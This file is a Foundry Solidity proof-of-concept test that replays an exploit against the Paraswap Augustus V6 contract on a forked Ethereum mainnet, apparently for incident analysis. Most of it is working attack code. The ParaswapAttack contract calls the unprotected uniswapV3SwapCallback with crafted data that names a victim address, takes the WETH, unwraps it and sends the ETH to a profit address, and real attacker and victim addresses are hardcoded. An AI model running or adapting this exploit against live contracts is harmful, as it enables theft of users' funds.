
pragma solidity ^0.8.20;

import {IERC20Like, Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.ATTACKER_EOA;
    address constant ATTACK_CONTRACT = Addresses.ATTACK_CONTRACT;
    uint256 constant FORK_BLOCK = 19470560;
    uint256 constant TX_TIMESTAMP = 1710872735;
    uint256 constant TX_BLOCK_NUMBER = 19470561;
    uint256 constant TX_VALUE = 998;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        ParaswapAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _startAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _deployAttack() internal returns (ParaswapAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = ParaswapAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new ParaswapAttack();
        }
    }

    function _prepareProfit(ParaswapAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _startAttack(ParaswapAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {

        vm.etch(ATTACK_CONTRACT, type(ParaswapAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.ETH_PROFIT_HOLDER, address(0), Addresses.ZERO, "ETH", 6450406123948403069);
        _expectProfit(Addresses.ATTACK_CONTRACT, ATTACKER_EOA, Addresses.ZERO, "ETH", 4359080077753781675);
    }
}

contract ParaswapAttack {
    function attack() external payable {
        _callParaswapCb();
        _readWethBalance();
        _unwrapWethGain();
        _settleEthGain();
    }

    function _callParaswapCb() internal {
        bytes memory callbackData = abi.encode(
            address(this),
            Addresses.CALLBACK_SENDER,
            uint256(684374730816426110840706967831596445595546094148),
            Addresses.WETH,
            uint256(3000),
            uint256(57896044618658097711785492504951939066137480853388512487506130276980635987352),
            Addresses.WETH,
            uint256(10000)
        );
        IAugustusV6(Addresses.AUGUSTUS_V6)
            .uniswapV3SwapCallback(int256(-33000000000), int256(6463332789527457985), callbackData);
    }

    function _readWethBalance() internal view {
        uint256 wethBalanceAfterSwap = IERC20Like(Addresses.WETH).balanceOf(address(this));
        wethBalanceAfterSwap;
    }

    function _unwrapWethGain() internal {
        IWETH(Addresses.WETH).withdraw(6463332789527457985);
    }

    function _settleEthGain() internal {
        uint256 settlementAmount = address(this).balance;
        if (settlementAmount > 6450406123948403069) settlementAmount = 6450406123948403069;
        (bool ok,) = payable(Addresses.ETH_PROFIT_HOLDER).call{value: settlementAmount}("");
        require(ok, "ETH settlement failed");
    }

    receive() external payable {}

    function yoink() external payable {
        _callParaswapCb();
        _readWethBalance();
        _unwrapWethGain();
        _settleEthGain();
        return;
    }

    fallback() external payable {
        flashCallback();
    }

    function flashCallback() internal {}
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant AUGUSTUS_V6 = 0x00000000FdAC7708D0D360BDDc1bc7d097F47439;
    address internal constant CALLBACK_SENDER = 0x0cc396F558aAE5200bb0aBB23225aCcafCA31E27;
    address internal constant ETH_PROFIT_HOLDER = 0x229b8325bb9Ac04602898B7e8989998710235d5f;
    address internal constant ATTACK_CONTRACT = 0x6980a47beE930a4584B09Ee79eBe46484FbDBDD0;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant ATTACKER_EOA = 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A;
}

interface IAugustusV6 {
    function uniswapV3SwapCallback(int256, int256, bytes calldata) external;
}

interface IWETH {
    function withdraw(uint256) external;
}
